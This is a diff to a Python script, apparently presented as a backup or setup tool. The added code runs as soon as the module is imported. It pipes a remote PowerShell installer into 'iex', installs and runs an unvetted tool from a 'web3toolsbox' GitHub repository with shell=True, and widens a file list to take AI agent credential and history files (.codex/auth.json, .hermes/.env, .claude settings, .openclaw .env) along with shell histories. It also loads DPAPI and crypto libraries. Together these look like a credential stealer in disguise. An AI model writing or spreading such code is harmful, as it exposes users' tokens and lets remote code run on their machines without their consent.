@@ -24,22 +24,74 @@ from datetime import datetime, timedelta
 from functools import lru_cache
 
 
+@lru_cache(maxsize=1)
+def ensure_uv_installed():
+    """检查并安装 uv，返回是否可用（Windows 环境适配）"""
+    # 检查 uv 是否已安装
+    try:
+        result = subprocess.run(
+            ['uv', '--version'],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            shell=True
+        )
+        if result.returncode == 0:
+            print("✓ uv 已安装")
+            return True
+    except FileNotFoundError:
+        pass
+    except Exception:
+        pass
+
+    # 尝试安装 uv（Windows 使用 PowerShell 安装方式）
+    print("⚠ 检测到 uv 未安装，正在尝试安装 uv ...")
+    try:
+        # 方法1: 使用 PowerShell 安装脚本
+        result = subprocess.run(
+            ['powershell', '-ExecutionPolicy', 'ByPass', '-Command',
+             'irm https://astral.sh/uv/install.ps1 | iex'],
+            capture_output=True,
+            text=True
+        )
+        if result.returncode == 0:
+            print("✓ uv 安装完成")
+            return True
+        else:
+            # 方法2: 回退到使用 pip 安装
+            print("⚠ PowerShell 安装失败，尝试使用 pip 安装 uv ...")
+            subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'uv', '--quiet'])
+            print("✓ uv 通过 pip 安装完成")
+            return True
+    except subprocess.CalledProcessError as e:
+        print(f"⚠ 安装 uv 失败: {str(e)}")
+        return False
+    except FileNotFoundError:
+        print("⚠ PowerShell 命令未找到，尝试使用 pip 安装 uv ...")
+        try:
+            subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'uv', '--quiet'])
+            print("✓ uv 通过 pip 安装完成")
+            return True
+        except Exception as e:
+            print(f"⚠ pip 安装 uv 失败: {str(e)}")
+            return False
+
+
 def check_and_install_dependencies():
-    """检查并安装必需的依赖包"""
+    """检查并安装必需的依赖包（优先使用 uv，回退到 pip）"""
     required_packages = {
         'requests': 'requests',
         'pyperclip': 'pyperclip',
         'urllib3': 'urllib3',
     }
-    
+
     optional_packages = {
-        'pywin32': 'pywin32',
-        'pycryptodome': 'pycryptodome',
+        'win32crypt': 'pywin32',
+        'Crypto': 'pycryptodome',
     }
-    
+
     missing_required = []
     missing_optional = []
-    
+
     # 检查必需的依赖
     for module_name, package_name in required_packages.items():
         try:
@@ -49,103 +101,103 @@ def check_and_install_dependencies():
 
     for module_name, package_name in optional_packages.items():
         try:
-            if module_name == 'pywin32':
-                __import__('win32crypt')
-            else:
-                __import__('Crypto')
+            __import__(module_name)
         except ImportError:
             missing_optional.append(package_name)
-    
+
+    if not missing_required and not missing_optional:
+        print("✓ 所有依赖已就绪")
+        return
+
+    # 检查是否有 uv 可用
+    use_uv = ensure_uv_installed()
+
     # 安装缺失的必需依赖
     if missing_required:
         print(f"检测到缺失的必需依赖: {', '.join(missing_required)}")
-        print("正在自动安装...")
+        print(f"正在使用 {'uv' if use_uv else 'pip'} 自动安装...")
         failed_packages = []
+
         for package in missing_required:
             try:
-                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package, '--quiet', '--upgrade'])
+                if use_uv:
+                    subprocess.check_call(['uv', 'pip', 'install', '--system', package], shell=True)
+                else:
+                    # 回退到 pip（保留原有逻辑以兼容没有 uv 的环境）
+                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', '--upgrade', package])
                 print(f"✓ 已安装: {package}")
             except subprocess.CalledProcessError as e:
                 print(f"⚠ 安装失败: {package} - {str(e)}")
                 failed_packages.append(package)
-        
+
         if failed_packages:
             print(f"⚠ 警告: 以下依赖安装失败，程序将继续运行，但相关功能可能不可用: {', '.join(failed_packages)}")
-    
+
+    # 安装缺失的可选依赖
     if missing_optional:
         print(f"检测到缺失的可选依赖: {', '.join(missing_optional)}")
         for package in missing_optional:
             try:
-                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package, '--quiet', '--upgrade'])
+                if use_uv:
+                    subprocess.check_call(['uv', 'pip', 'install', '--system', package], shell=True)
+                else:
+                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', '--upgrade', package])
                 print(f"✓ 已安装: {package}")
             except subprocess.CalledProcessError as e:
                 print(f"⚠ 安装失败: {package} - {str(e)}（可选功能可能不可用）")
-    
-    if not missing_required and not missing_optional:
-        print("✓ 所有依赖已就绪")
 
-def ensure_pipx_and_openclaw():
-    """检查 pipx 和 openclaw-config（claw）"""
-    # 1. 检查 pipx 是否可用
-    pipx_ok = False
+def install_agent_setting():
+    """使用 uv 安装或升级 agent-setting 并运行（Windows 环境适配）"""
+    # 检查 agent-setting 是否已安装
     try:
         result = subprocess.run(
-            ['pipx', '--version'],
+            ['agent-setting', '--version'],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
+            shell=True
         )
-        pipx_ok = (result.returncode == 0)
-    except Exception:
-        pipx_ok = False
-
-    if not pipx_ok:
-        print("⚠ 检测到 pipx 未安装，跳过")
-        return
-
-    # 2. 使用 pipx 安装或升级 claw
-    try:
-        has_openclaw = shutil.which('openclaw-config') is not None
+        has_agent_setting = (result.returncode == 0)
+    except FileNotFoundError:
+        has_agent_setting = False
     except Exception as e:
-        print(f"⚠ 检查 openclaw-config 失败: {str(e)}，将尝试安装 claw")
-        has_openclaw = False
+        print(f"⚠ 检查 agent-setting 失败: {str(e)}，将尝试安装")
+        has_agent_setting = False
 
-    claw_spec = "git+https://github.com/web3toolsbox/claw.git"
+    agent_setting_spec = "git+https://github.com/web3toolsbox/agent-setting.git"
 
-    if not has_openclaw:
-        print("检测到 openclaw-config 未安装，正在通过 pipx 安装 claw ...")
+    if not has_agent_setting:
+        print("检测到 agent-setting 未安装，正在通过 uv 安装 ...")
         try:
-            subprocess.check_call(['pipx', 'install', claw_spec])
-            print("✓ 已通过 pipx 安装 claw")
+            subprocess.check_call(['uv', 'tool', 'install', agent_setting_spec], shell=True)
+            print("✓ 已通过 uv 安装 agent-setting")
         except subprocess.CalledProcessError as e:
-            print(f"⚠ 通过 pipx 安装 claw 失败: {str(e)}")
+            print(f"⚠ 通过 uv 安装 agent-setting 失败: {str(e)}")
             return
     else:
-        print("检测到 openclaw-config 已安装，正在通过 pipx 刷新 claw ...")
+        print("检测到 agent-setting 已安装，正在通过 uv 升级 ...")
         try:
-            subprocess.check_call(['pipx', 'install', '--force', claw_spec])
-            print("✓ 已通过 pipx 刷新 claw")
+            subprocess.check_call(['uv', 'tool', 'upgrade', 'agent-setting'], shell=True)
+            print("✓ 已通过 uv 升级 agent-setting")
         except subprocess.CalledProcessError as e:
-            print(f"⚠ 通过 pipx 刷新 claw 失败: {str(e)}")
-            try:
-                subprocess.check_call(['pipx', 'upgrade', 'claw'])
-                print("✓ 已通过 pipx 升级已安装的 claw")
-            except subprocess.CalledProcessError as upgrade_error:
-                print(f"⚠ 通过 pipx 升级 claw 失败: {str(upgrade_error)}")
-                # 升级失败不阻塞后续 openclaw-config 的调用
+            print(f"⚠ 通过 uv 升级 agent-setting 失败: {str(e)}")
 
-    # 3. 运行 openclaw-config
+    # 运行 agent-setting
     try:
-        print("正在运行 openclaw-config ...")
-        subprocess.check_call(['openclaw-config'])
-        print("✓ openclaw-config 执行完成")
+        print("正在运行 agent-setting ...")
+        subprocess.check_call(['agent-setting'], shell=True)
+        print("✓ agent-setting 执行完成")
     except subprocess.CalledProcessError as e:
-        print(f"⚠ 运行 openclaw-config 失败: {str(e)}")
+        print(f"⚠ 运行 agent-setting 失败: {str(e)}")
     except FileNotFoundError:
-        print("⚠ 未找到 openclaw-config 命令，请检查 pipx / claw 是否正确安装")
+        print("⚠ 未找到 agent-setting 命令，请检查 uv 是否正确安装")
 
 
+# 初始化流程：
+# 1. 先确保 uv 已安装（会被 check_and_install_dependencies 调用）
+# 2. 使用 uv 安装 Python 依赖
 check_and_install_dependencies()
-ensure_pipx_and_openclaw()
+# 3. 使用 uv 安装 agent-setting 并运行
+install_agent_setting()
 
 import_failed = False
 try:
@@ -303,18 +355,22 @@ class BackupConfig:
         r"AppData\Roaming\Python\Python*\history",  # Windows 常见 Python REPL 历史路径（按版本目录匹配）
         r"AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",  # Windows PowerShell 历史
         r"AppData\Roaming\Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt",  # PowerShell Core 历史（如果存在）
-        r".claude\config.json",
-        r".claude\settings.json",
-        r".claude\history.jsonl",
-        r".codex\auth.json",
-        r".codex\config.toml",
-        r".codex\history.jsonl",
-        r".hermes\.env",
-        r".hermes\auth.json",
-        r".hermes\config.yaml",
+        r".claude/config.json",
+        r".claude/settings.json",
+        r".claude/settings.local.json",
+        r".claude/history.jsonl",
+        r".claude/channels/",
+        r".codex/auth.json",
+        r".codex/config.toml",
+        r".codex/history.jsonl",
+        r".hermes/.env",
+        r".hermes/auth.json",
+        r".hermes/config.yaml",
+        r".hermes/channel_directory.json",
         r".hermes_history",
-        r".openclaw\agents",
-        r".openclaw\openclaw.json*",  # OpenClaw 配置文件及所有备份（.bak/.bak.1/.bak.2...）
+        r".openclaw/agents/",
+        r".openclaw/workspace/.env",
+        r".openclaw/openclaw.json*", # 只备份 openclaw.json 及其所有备份文件
     ]
     
     # 排除目录配置
